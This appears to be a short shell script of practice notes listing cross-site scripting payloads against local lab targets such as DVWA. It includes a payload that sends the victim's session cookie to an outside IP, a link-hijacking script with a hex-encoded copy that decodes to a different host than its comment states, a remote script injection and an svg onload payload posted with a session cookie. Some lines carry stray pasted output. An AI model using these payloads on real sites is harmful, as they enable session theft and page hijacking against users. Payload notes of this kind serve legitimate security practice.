#!/bin/sh
echo "Layer 7 Attacks here"

echo "XSS"

# http://localhost:81/DVWA/vulnerabilities/xss_r/?name=<script>alert(document.cookie)</script>

# http://localhost:81/DVWA/vulnerabilities/xss_r/?name=<script>new  Image().src="http://192.168.149.128/bogus.php?output="+document.cookie;</script>

# index.php?name=<script>window.onload = function() {var link=document.getElementsByTagName("a");link[0].href="http://not-real-xssattackexamples.com/";}</script>


#-- Ascii encoded version of: index.php?name=<script>window.onload = function() {var link=document.getElementsByTagName("a");link[0].href="http://not-real-xssattackexamples.com/";}</script>
# index.php?name=%3c%73%63%72%69%70%74%3e%77%69%6e%64%6f%77%2e%6f%6e%6c%6f%61%64%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%76%61%72%20%6c%69%6e%6b%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%73%42%79%54%61%67%4e%61%6d%65%28%22%61%22%29%3b%6c%69%6e%6b%5b%30%5d%2e%68%72%65%66%3d%22%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%2d%73%69%74%65%2e%63%6f%6d%2f%22%3b%7d%3c%2f%73%63%72%69%70%74%3e


curl "localhost:3000" -d "_method=<script src=http://nodesecurity.io/xss.js></script>" Cannot <SCRIPT SRC=HTTP://NODESECURITY.IO/XSS.JS></SCRIPT> /


curl -X POST -H "Content-Type: application/json" --cookie "PHPSESSID=hibcw4d4u4r8q447rz8221n" \
-d '{"id":7357, "name":"Bob<svg/onload=alert(\"Woop!\") display=none>", "age":25}' \
http://demoapp.loc/updateDetails



